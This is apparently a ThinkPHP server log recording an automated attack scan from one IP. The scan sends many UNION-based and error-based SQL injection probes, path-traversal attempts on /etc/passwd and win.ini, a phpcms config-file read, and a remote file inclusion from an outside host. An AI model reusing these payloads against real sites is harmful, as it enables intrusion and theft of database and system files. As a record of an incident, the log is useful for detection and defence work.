INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001107s ]
INFO: [ app_init ] --END-- [ RunTime:0.001473s ]
ERR: 无法加载模块:-1619) UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:24+08:00 ] 121.42.0.14 /index.php?s=-1113%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001127s ]
INFO: [ app_init ] --END-- [ RunTime:0.001484s ]
ERR: 无法加载模块:-1113) UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:25+08:00 ] 121.42.0.14 /index.php?s=-1250%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001120s ]
INFO: [ app_init ] --END-- [ RunTime:0.001621s ]
ERR: 无法加载模块:-1250) UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:26+08:00 ] 121.42.0.14 /index.php?s=-1402%27%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001187s ]
INFO: [ app_init ] --END-- [ RunTime:0.001550s ]
ERR: 无法加载模块:-1402') UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:26+08:00 ] 121.42.0.14 /index.php?s=-1300%27%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001237s ]
INFO: [ app_init ] --END-- [ RunTime:0.001595s ]
ERR: 无法加载模块:-1300') UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:27+08:00 ] 121.42.0.14 /index.php?s=-1342%27%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001188s ]
INFO: [ app_init ] --END-- [ RunTime:0.001537s ]
ERR: 无法加载模块:-1342') UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:28+08:00 ] 121.42.0.14 /index.php?s=-1294%27%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001086s ]
INFO: [ app_init ] --END-- [ RunTime:0.001431s ]
ERR: 无法加载模块:-1294') UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:28+08:00 ] 121.42.0.14 /index.php?s=-1742%27%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001118s ]
INFO: [ app_init ] --END-- [ RunTime:0.001544s ]
ERR: 无法加载模块:-1742') UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:29+08:00 ] 121.42.0.14 /index.php?s=-1169%27%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001141s ]
INFO: [ app_init ] --END-- [ RunTime:0.001522s ]
ERR: 无法加载模块:-1169') UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:30+08:00 ] 121.42.0.14 /index.php?s=-1505%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001095s ]
INFO: [ app_init ] --END-- [ RunTime:0.001454s ]
ERR: 无法加载模块:-1505' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:31+08:00 ] 121.42.0.14 /index.php?s=-1318%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001121s ]
INFO: [ app_init ] --END-- [ RunTime:0.001537s ]
ERR: 无法加载模块:-1318' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:31+08:00 ] 121.42.0.14 /index.php?s=-1928%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001301s ]
INFO: [ app_init ] --END-- [ RunTime:0.001671s ]
ERR: 无法加载模块:-1928' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:32+08:00 ] 121.42.0.14 /index.php?s=-1179%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001156s ]
INFO: [ app_init ] --END-- [ RunTime:0.001583s ]
ERR: 无法加载模块:-1179' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:33+08:00 ] 121.42.0.14 /index.php?s=-1980%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001140s ]
INFO: [ app_init ] --END-- [ RunTime:0.001545s ]
ERR: 无法加载模块:-1980' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:33+08:00 ] 121.42.0.14 /index.php?s=-1454%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001088s ]
INFO: [ app_init ] --END-- [ RunTime:0.001431s ]
ERR: 无法加载模块:-1454' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:34+08:00 ] 121.42.0.14 /index.php?s=-1548%25%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001219s ]
INFO: [ app_init ] --END-- [ RunTime:0.001563s ]
ERR: 无法加载模块:-1548%' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:34+08:00 ] 121.42.0.14 /index.php?s=-1403%25%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001177s ]
INFO: [ app_init ] --END-- [ RunTime:0.001633s ]
ERR: 无法加载模块:-1403%' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:36+08:00 ] 121.42.0.14 /index.php?s=-1705%25%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001103s ]
INFO: [ app_init ] --END-- [ RunTime:0.001492s ]
ERR: 无法加载模块:-1705%' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:36+08:00 ] 121.42.0.14 /index.php?s=-1674%25%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000030s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001483s ]
INFO: [ app_init ] --END-- [ RunTime:0.002084s ]
ERR: 无法加载模块:-1674%' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:37+08:00 ] 121.42.0.14 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001293s ]
INFO: [ app_init ] --END-- [ RunTime:0.001739s ]
ERR: 无法加载模块:Search

[ 2015-12-31T11:34:37+08:00 ] 121.42.0.14 /index.php?s=-1997%25%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001185s ]
INFO: [ app_init ] --END-- [ RunTime:0.001714s ]
ERR: 无法加载模块:-1997%' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:38+08:00 ] 121.42.0.14 /index.php?s=-1851%25%27+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001294s ]
INFO: [ app_init ] --END-- [ RunTime:0.001643s ]
ERR: 无法加载模块:-1851%' UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:38+08:00 ] 121.42.0.14 /index.php?s=-1736+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001211s ]
INFO: [ app_init ] --END-- [ RunTime:0.001586s ]
ERR: 无法加载模块:-1736 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:39+08:00 ] 121.42.0.14 /index.php?s=-1794+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001285s ]
INFO: [ app_init ] --END-- [ RunTime:0.001681s ]
ERR: 无法加载模块:-1794 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:40+08:00 ] 121.42.0.14 /index.php?s=-1551+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001117s ]
INFO: [ app_init ] --END-- [ RunTime:0.001476s ]
ERR: 无法加载模块:-1551 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:40+08:00 ] 121.42.0.14 /index.php?s=-1828+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001171s ]
INFO: [ app_init ] --END-- [ RunTime:0.001550s ]
ERR: 无法加载模块:-1828 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:41+08:00 ] 121.42.0.14 /index.php?s=-1112+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001092s ]
INFO: [ app_init ] --END-- [ RunTime:0.001434s ]
ERR: 无法加载模块:-1112 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:41+08:00 ] 121.42.0.14 /index.php?s=-1120+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001145s ]
INFO: [ app_init ] --END-- [ RunTime:0.001519s ]
ERR: 无法加载模块:-1120 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:42+08:00 ] 121.42.0.14 /index.php?s=-1714+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001429s ]
INFO: [ app_init ] --END-- [ RunTime:0.001798s ]
ERR: 无法加载模块:-1714 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:43+08:00 ] 121.42.0.14 /index.php?s=-1963+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001182s ]
INFO: [ app_init ] --END-- [ RunTime:0.001534s ]
ERR: 无法加载模块:-1963 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:43+08:00 ] 121.42.0.14 /index.php?s=-1380+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001145s ]
INFO: [ app_init ] --END-- [ RunTime:0.001499s ]
ERR: 无法加载模块:-1380 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:44+08:00 ] 121.42.0.14 /index.php?s=-1444+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001177s ]
INFO: [ app_init ] --END-- [ RunTime:0.001553s ]
ERR: 无法加载模块:-1444 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:45+08:00 ] 121.42.0.14 /index.php?s=-1215+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001146s ]
INFO: [ app_init ] --END-- [ RunTime:0.001495s ]
ERR: 无法加载模块:-1215 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:45+08:00 ] 121.42.0.14 /index.php?s=-1559+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001228s ]
INFO: [ app_init ] --END-- [ RunTime:0.001593s ]
ERR: 无法加载模块:-1559 UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:35:14+08:00 ] 121.42.0.14 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001267s ]
INFO: [ app_init ] --END-- [ RunTime:0.001624s ]
ERR: 无法加载模块:Goods

[ 2015-12-31T11:35:49+08:00 ] 121.42.0.14 /index.php?m=tg/admin&s=delivery_address
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001063s ]
INFO: [ app_init ] --END-- [ RunTime:0.001408s ]
ERR: 无法加载模块:Delivery_address

[ 2015-12-31T11:35:50+08:00 ] 121.42.0.14 /index.php?m=download/admin&s=order_update
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001138s ]
INFO: [ app_init ] --END-- [ RunTime:0.001519s ]
ERR: 无法加载模块:Order_update

[ 2015-12-31T11:35:51+08:00 ] 121.42.0.14 /index.php?m=buy/admin&s=add_cat
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001191s ]
INFO: [ app_init ] --END-- [ RunTime:0.001618s ]
ERR: 无法加载模块:Add_cat

[ 2015-12-31T11:36:14+08:00 ] 121.42.0.14 /index.php?m=vote&c=index&a=post&subjectid=2
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001171s ]
INFO: [ app_init ] --END-- [ RunTime:0.001527s ]
ERR: 无法加载模块:Vote

[ 2015-12-31T11:36:15+08:00 ] 121.42.0.14 /index.php?m=vote&c=index&a=result&subjectid=2&siteid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001119s ]
INFO: [ app_init ] --END-- [ RunTime:0.001526s ]
ERR: 无法加载模块:Vote

[ 2015-12-31T11:38:26+08:00 ] 121.42.0.14 /index.php?s=%2Fetc%2Fpasswd
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001122s ]
INFO: [ app_init ] --END-- [ RunTime:0.001471s ]
ERR: 无法加载模块:Etc

[ 2015-12-31T11:38:28+08:00 ] 121.42.0.14 /index.php?s=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000046s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001282s ]
INFO: [ app_init ] --END-- [ RunTime:0.001717s ]

[ 2015-12-31T11:38:31+08:00 ] 121.42.0.14 /index.php?s=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001171s ]
INFO: [ app_init ] --END-- [ RunTime:0.001575s ]

[ 2015-12-31T11:38:36+08:00 ] 121.42.0.14 /index.php?s=http://120.26.55.211/s.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001184s ]
INFO: [ app_init ] --END-- [ RunTime:0.001555s ]
ERR: 无法加载模块:Http:

[ 2015-12-31T11:38:39+08:00 ] 121.42.0.14 /index.php?s=http%3A%2F%2F120.26.55.211%2Fs.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001550s ]
INFO: [ app_init ] --END-- [ RunTime:0.001970s ]
ERR: 无法加载模块:Http:

